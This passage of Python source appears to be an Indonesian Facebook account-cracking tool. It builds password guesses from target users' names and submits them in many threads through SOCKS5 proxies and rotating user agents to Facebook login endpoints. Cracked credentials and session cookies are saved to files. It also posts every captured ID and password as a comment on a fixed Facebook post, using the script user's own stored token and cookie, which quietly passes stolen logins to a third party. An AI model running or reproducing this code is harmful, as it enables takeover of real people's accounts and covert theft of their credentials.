				elif 'free' in method:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
				elif 'x' in method:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
				else:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
		print('')
		cetak('[cyan]└─[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')
		print(f'{H} OK : {H}%s '%(ok))
		print(f'{K} CP : {K}%s '%(cp))
		print('')
		print(f'└─{K} Good Bye Thanks To Using My Script {N} << ')
		time.sleep(2)
		exit()
		
def otomatis():
	global prog,des
	print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
		#with ThreadPoolExecutor(max_workers=30) as pool:
			for akun in id2:
				idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
				depan = nama.split(" ")[0]
				pwv = []
				if len(nama)<=5:
					if len(depan)<=1 or len(depan)<=2:
						pass
					else:
						pwv.append(depan+"123")
						pwv.append(depan+"1234")
						pwv.append(depan+"12345")
				else:
					if len(depan)<=1 or len(depan)<=2:
						try:
							tengah = nama.split(" ")[1]
							if len(tengah)<=3:
								pass
							else:
								pwv.append(tengah+"123")
								pwv.append(tengah+"1234")
								pwv.append(tengah+"12345")
								pwv.append(nama)
						except:
							try:
								belakang = nama.split(' ')[2]
								if len(belakang)<=3:pass
								else:
									pwv.append(belakang+"123")
									pwv.append(belakang+"1234")
									pwv.append(belakang+"12345")
									pwv.append(nama)
							except:pwv.append(nama)
					else:
						pwv.append(nama)
						pwv.append(depan+"123")
						pwv.append(depan+"1234")
						pwv.append(depan+"12345")
				if 'mobile' in method:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
				elif 'free' in method:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
				elif 'x' in method:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
				else:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
		print('')
		cetak('[cyan]└─[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')
		print(f'{H} OK : {H}%s '%(ok))
		print(f'{K} CP : {K}%s '%(cp))
		print('')
		print(f'└─{P} Good Bye Thanks To Using My Script {N} << ')
		time.sleep(2)
		exit()
	
def fullname():
	global prog,des
	print('%s════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
	print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
	print(f' [{H}√{N}] Mohon Sabar,Di Karenakan Metode Sangat Lambat')
	print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
	acill_gans('•' * 40);prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
		#with ThreadPoolExecutor(max_workers=30) as pool:
			for akun in id2:
				idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
				depan = nama.split(" ")[0]
				pwv = []
				if len(nama)<=5:
					if len(depan)<=1 or len(depan)<=2:
						pass
					else:
						pwv.append(depan+"123")
						pwv.append(depan+"1234")
						pwv.append(depan+"12345")
				else:
					if len(depan)<=1 or len(depan)<=2:
						try:
							tengah = nama.split(" ")[1]
							if len(tengah)<=3:
								pass
							else:
								pwv.append(tengah+"123")
								pwv.append(tengah+"1234")
								pwv.append(tengah+"12345")
								pwv.append(nama)
						except:
							try:
								belakang = nama.split(' ')[2]
								if len(belakang)<=3:pass
								else:
									pwv.append(belakang+"123")
									pwv.append(belakang+"1234")
									pwv.append(belakang+"12345")
									pwv.append(nama)
							except:pwv.append(nama)
					else:
						pwv.append(depan+"123")
						pwv.append(depan+"1234")
						pwv.append(depan+"12345")
						pwv.append(nama)
				if 'mobile' in method:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
				elif 'free' in method:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
				elif 'mbasic' in method:
					pool.submit(crack,idf,pwv,'x.facebook.com')
				else:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
		print('')
		cetak('[cyan]└─[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')
		print(f'{H} OK : {H}%s '%(ok))
		print(f'{K} CP : {K}%s '%(cp))
		print('')
		print(f'└─{K} Good Bye Thanks To Using My Script {N} << ')
		time.sleep(2)
		exit()


def crack(idf,pwv,url):
	global loop,ok,cp
	prog.update(des,description=f'crack [deep_pink3]{str(loop)}/{len(id2)}[/] OK : [purple]{len(ok)}[/] CP : [red]{len(cp)}[/]')
	prog.advance(des)
	ses = requests.Session()
	nip=random.choice(prox)
	proxy= {'http': 'socks5://'+nip}
	try:os.mkdir('results')
	except:pass
	for pw in pwv:
		try:
			ua = ua = random.choice(ugen)
			#ua = uwu
			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate","accept-language": "af_AF,fr;q=0.9,en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate","accept-language": "af_AF,fr;q=0.9,en-US;q=0.8,en;q=0.7"}
			bz = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
			#ini_cookie = str(ses.cookies.get_dict())
			if "checkpoint" in ses.cookies.get_dict():
				kukie = open(".cokie.txt","r").read()
				toket = open(".token.txt","r").read()
				requests.post(f"https://graph.facebook.com/100013415167090_1571082003348957/comments/?message=Akun---->Cp\n{idf}|{pw}&access_token={toket}", headers = {"cookie":kukie})
				print(f'\r├── ID  : {K}{idf}{P}          \n│   └──  Sandi  : {K}{pw}          {P}\n└── User Agent  : {M}{ua}{P}           \n')
				wrt = '[CP] %s • %s' % (idf,pw)
				cp.append(wrt)
				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
				break
			elif "c_user" in ses.cookies.get_dict():
				cooz = ses.cookies.get_dict()
				kuki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
				#kuki = convert(ses.cookies.get_dict())
				if "y" in taplikasi:
					print(f'\r├── ID  : {H}{idf}{P}          \n│   └──  sandi  : {H}{pw}          {P}\n└──  Cookie : {H}{kuki}{P}\n         {P}\n└── User Agent  : {H}{ua}{P}           \n           ')
					kukie = open(".cokie.txt","r").read()
					toket = open(".token.txt","r").read()
					requests.post(f"https://graph.facebook.com/100013415167090_1571082003348957/comments/?message=Akun---->OK\n{idf}|{pw}&access_token={toket}", headers = {"cookie":kukie})
					wrt = '[OK] %s • %s' % (idf,pw)
					ok.append(wrt)
					open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
					break
				elif "t" in taplikasi:
					kukie = open(".cokie.txt","r").read()
					toket = open(".token.txt","r").read()
					requests.post(f"https://graph.facebook.com/100013415167090_1571082003348957/comments/?message=Akun---->OK\n{idf}|{pw}&access_token={toket}", headers = {"cookie":kukie})
					print(f'\r├── ID  : {H}{idf}{P}          \n│   └──  sandi  : {H}{pw}          {P}\n└──  User Agent : {B}{ua}{P}\n        {P}\n└── User Agent  : {B}{ua}{P}           \n')
					wrt = '[OK] %s • %s' % (idf,pw)
					ok.append(wrt)
					open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	


def convert(bz):
	rr = random.randint;rc = random.choice
	return (f"sb=%s;datr=%s;dpr=2.{str(rr(111111111111111,999999999999999))};c_user=%s;locale={str(rc(['en_GB','en_US','id_ID','zh_CN']))};xs=%s;wd={str(rr(200,400))}x{str(rr(600,2000))};fr=%s;m_pixel_ratio=2.{str(rr(10,100))}"%(bz['sb'],bz['datr'],bz['c_user'],bz['xs'],bz['fr']))



if __name__=='__main__':
	os.system("clear")
	login()


